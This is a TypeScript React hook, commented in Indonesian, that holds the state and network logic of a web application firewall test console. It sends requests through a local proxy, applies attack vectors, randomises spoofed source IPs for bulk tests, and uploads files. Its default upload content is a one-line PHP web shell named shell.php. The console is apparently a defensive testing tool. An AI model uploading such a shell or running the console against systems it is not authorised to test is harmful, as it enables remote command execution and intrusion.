import { useEffect, useState } from "react";
import { randomPublicIp } from "@/lib/ip";
import { recommendedMethod, type AttackVector } from "@/lib/vectors";

const STORAGE_KEY = "waf-test-console-v1";
const MAX_HISTORY = 50;

/** State formulir permintaan pada konsol uji WAF. */
export interface WafForm {
  target: string;
  path: string;
  ip: string;
  method: string;
  userAgent: string;
  payload: string;
  contentType: string;
  uploadEnabled: boolean;
  uploadField: string;
  uploadFilename: string;
  uploadType: string;
  uploadContent: string;
}

/** Spesifikasi berkas multipart yang dikirim ke proxy. */
export interface ProxyUpload {
  field: string;
  filename: string;
  content_type: string;
  content: string;
}

/** Payload yang dikirim ke POST /api/proxy. */
export interface ProxyPayload {
  target: string;
  path: string;
  ip: string;
  method: string;
  user_agent: string;
  payload: string;
  content_type: string;
  upload: ProxyUpload | null;
}

/** Hasil mentah dari proxy (success) maupun kegagalan jaringan. */
export interface ProxyResult {
  success: boolean;
  message?: string;
  ip?: string;
  status?: number;
  status_text?: string;
  blocked?: boolean;
  duration_ms?: number;
  size?: number;
  truncated?: boolean;
  body?: string;
  content_type?: string;
  base_url?: string;
  url?: string;
  request_headers?: string;
  response_headers?: string;
  responseHeaders?: string;
  request?: { method?: string };
  [key: string]: unknown;
}

/** Satu baris riwayat pengiriman. */
export interface HistoryEntry {
  time: string;
  ip: string | undefined;
  path: string;
  method: string;
  status: number | undefined;
  blocked: boolean;
  ms: number | undefined;
}

/** Override parsial untuk pengiriman arbitrer via sendRaw. */
export interface SendRawOverride {
  target?: string;
  path?: string;
  ip?: string;
  method?: string;
  userAgent?: string;
  payload?: string;
  contentType?: string;
  upload?: ProxyUpload | null;
}

/** Vektor aktif yang sedang diterapkan pada formulir. */
export type ActiveVector = AttackVector & { method: string; group: string };

const DEFAULT_FORM: WafForm = {
    target: "http://localhost:8000",
    path: "/",
    ip: "",
    method: "GET",
    userAgent: "",
    payload: "",
    contentType: "",
    uploadEnabled: false,
    uploadField: "file",
    uploadFilename: "shell.php",
    uploadType: "application/x-php",
    uploadContent: '<?php system($_GET["cmd"]); ?>',
};

function loadStoredForm(): WafForm {
    try {
        const stored =
            JSON.parse(window.localStorage.getItem(STORAGE_KEY) ?? "{}") as Partial<WafForm> ?? {};

        return { ...DEFAULT_FORM, ...stored };
    } catch {
        return { ...DEFAULT_FORM };
    }
}

/**
 * Seluruh state + logika jaringan konsol uji WAF.
 *
 * Dipisah dari UI supaya `App.jsx` tetap tipis (hanya menyusun komponen) dan
 * logika bisa dipakai ulang / diuji tanpa me-render halaman.
 */
export function useWafConsole() {
    const [form, setForm] = useState<WafForm>(loadStoredForm);
    const [result, setResult] = useState<ProxyResult | null>(null);
    const [history, setHistory] = useState<HistoryEntry[]>([]);
    const [tab, setTab] = useState<string>("body");
    const [loading, setLoading] = useState<boolean>(false);
    const [progress, setProgress] = useState<string>("");
    const [previewOpen, setPreviewOpen] = useState<boolean>(false);
    const [activeVector, setActiveVector] = useState<ActiveVector | null>(null);

    useEffect(() => {
        window.localStorage.setItem(STORAGE_KEY, JSON.stringify(form));
    }, [form]);

    const update = (patch: Partial<WafForm>): void => setForm((prev) => ({ ...prev, ...patch }));

    const randomizeIp = (): void => update({ ip: randomPublicIp() });

    const postProxy = async (payload: ProxyPayload): Promise<ProxyResult> => {
        const response = await fetch("/api/proxy", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
        });

        return response.json() as Promise<ProxyResult>;
    };

    const send = async (ipOverride?: string): Promise<ProxyResult | null> => {
        const target = form.target.trim();

        if (target === "") {
            setResult({ success: false, message: "URL target wajib diisi." });

            return null;
        }

        const ip = (ipOverride ?? form.ip).trim();
        const path = form.path.trim() || "/";

        setLoading(true);

        try {
            const data = await postProxy({
                target,
                path,
                ip,
                method: form.method,
                user_agent: form.userAgent.trim(),
                payload: form.payload,
                content_type: form.contentType.trim(),
                upload: form.uploadEnabled
                    ? {
                          field: form.uploadField.trim() || "file",
                          filename: form.uploadFilename.trim() || "shell.php",
                          content_type:
                              form.uploadType.trim() ||
                              "application/octet-stream",
                          content: form.uploadContent,
                      }
                    : null,
            });

            setResult(data);

            if (data.success) {
                update({ ip: data.ip ?? ip });
                setTab("body");
                setHistory((prev) =>
                    [
                        {
                            time: new Date().toLocaleTimeString(),
                            ip: data.ip,
                            path,
                            method: form.method,
                            status: data.status,
                            blocked: data.blocked === true,
                            ms: data.duration_ms,
                        },
                        ...prev,
                    ].slice(0, MAX_HISTORY),
                );
            }

            return data;
        } catch (error) {
            // Kegagalan fetch di level jaringan (dev-server mati / koneksi putus)
            // dilempar sebagai TypeError, bukan Error biasa.
            const unreachable = error instanceof TypeError;
            const message = error instanceof Error ? error.message : String(error);

            setResult({
                success: false,
                message: unreachable
                    ? 'Tidak dapat menghubungi dev-server (/api/proxy). Pastikan "pnpm dev" masih berjalan, lalu muat ulang halaman ini.'
                    : `Kesalahan jaringan: ${message}`,
            });

            return null;
        } finally {
            setLoading(false);
        }
    };

    /**
     * Mengirim permintaan arbitrer tanpa menyentuh state `result`/`history`.
     * Dipakai tab "Pengujian Serangan" supaya serangan tidak mengubah temuan
     * pada tab pertama.
     */
    const sendRaw = async (override: SendRawOverride = {}): Promise<ProxyResult> => {
        const payload: ProxyPayload = {
            target: (override.target ?? form.target).trim(),
            path: (override.path ?? form.path).trim() || "/",
            ip: (override.ip ?? form.ip ?? "").trim(),
            method: override.method ?? form.method,
            user_agent: (override.userAgent ?? form.userAgent ?? "").trim(),
            payload: override.payload ?? "",
            content_type: (override.contentType ?? "").trim(),
            upload: override.upload ?? null,
        };

        try {
            return await postProxy(payload);
        } catch (error) {
            const message = error instanceof Error ? error.message : String(error);
            return {
                success: false,
                message: `Kesalahan jaringan: ${message}`,
            };
        }
    };

    const sendWithRandomIp = async (): Promise<void> => {
        if (loading || progress !== "") {
            return;
        }

        const ip = randomPublicIp();
        update({ ip });
        await send(ip);
    };

    const bulkTest = async (count: number): Promise<void> => {
        if (loading || progress !== "") {
            return;
        }

        try {
            for (let index = 0; index < count; index += 1) {
                const ip = randomPublicIp();
                update({ ip });
                setProgress(`Menguji ${index + 1}/${count} IP acak...`);

                await send(ip);
            }
        } finally {
            setProgress("");
        }
    };

    const applyVector = (vector: AttackVector, group?: string): void => {
        const upload = vector.upload;
        const method = recommendedMethod(vector);

        update({
            path: vector.path,
            method,
            ...(vector.userAgent !== undefined
                ? { userAgent: vector.userAgent }
                : {}),
            ...(vector.payload !== undefined
                ? { payload: vector.payload }
                : {}),
            uploadEnabled: Boolean(upload),
            ...(upload
                ? {
                      uploadField: upload.field ?? form.uploadField,
                      uploadFilename: upload.filename ?? form.uploadFilename,
                      uploadType: upload.content_type ?? form.uploadType,
                      uploadContent: upload.content ?? form.uploadContent,
                  }
                : {}),
        });

        setActiveVector({
            ...vector,
            method,
            group: group ?? vector.group ?? "",
        });
    };

    const clearVector = (): void => setActiveVector(null);

    const clearHistory = (): void => setHistory([]);

    return {
        form,
        update,
        result,
        history,
        tab,
        setTab,
        loading,
        progress,
        previewOpen,
        setPreviewOpen,
        send,
        sendRaw,
        activeVector,
        clearVector,
        randomizeIp,
        sendWithRandomIp,
        bulkTest,
        applyVector,
        clearHistory,
    };
}

export type WafConsole = ReturnType<typeof useWafConsole>;
export type SendRawFn = (override?: SendRawOverride) => Promise<ProxyResult>;
